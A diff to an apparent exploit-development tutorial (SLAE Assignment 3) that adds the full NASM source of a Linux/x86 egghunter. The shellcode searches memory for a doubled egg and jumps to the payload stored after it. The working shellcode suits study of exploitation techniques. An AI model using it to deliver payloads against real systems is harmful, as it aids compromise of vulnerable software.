@@ -112,7 +112,42 @@ egghunter:
 	jnz efault_check     ;if they dont match, continue looking
 	jmp edi              ;if all bytes match, jump to location and execute
 ```
-Remember we prepend our shellcode with the egg twice. This part of the code checks for that.
+Remember we prepend our shellcode with the egg twice. This part of the code checks for that. Our final code looks like this:
+```nasm
+; SLAE Assignment 3: Egghunter Shellcode (Linux/x86)
+; Author:  4p0cryph0n
+; Website:  https://4p0cryph0n.github.io
+
+global _start:
+
+section .text
+_start:
+
+page_size:
+
+ or cx, 0xfff         ;or with 4095
+
+efault_check:
+
+ xor eax, eax         ;clearing eax
+ inc ecx
+ mov al, 0x43         ;67 --> sigaction
+ int 0x80             ;syscall
+
+ cmp al, 0xf2         ;compare the flag returned to EFAULT
+ jz page_size         ;If it matches, set page alignment again and search through next region
+
+egghunter:
+
+ mov eax, 0xdeadbeef  ;our egg
+ mov edi, ecx         ;pointer to memory region
+ scasd                ;compare first 4 bytes stored in eax with edi (first egg)
+ jnz efault_check     ;if they dont match, continue looking
+ scasd                ;compare last 4 bytes stored in eax with edi (second egg)
+ jnz efault_check     ;if they dont match, continue looking
+ jmp edi              ;if all bytes match, jump to location and execute
+```
+To compare the data stored in a memory location with our egg, we will use the ```scasd``` instruction, which compares bytes stored in edi with eax.
 
 Now, we will need to write some c code, which includes both our shellcode and our egghunter. Before that. let's extract our egghunter's shellcode:
 ```
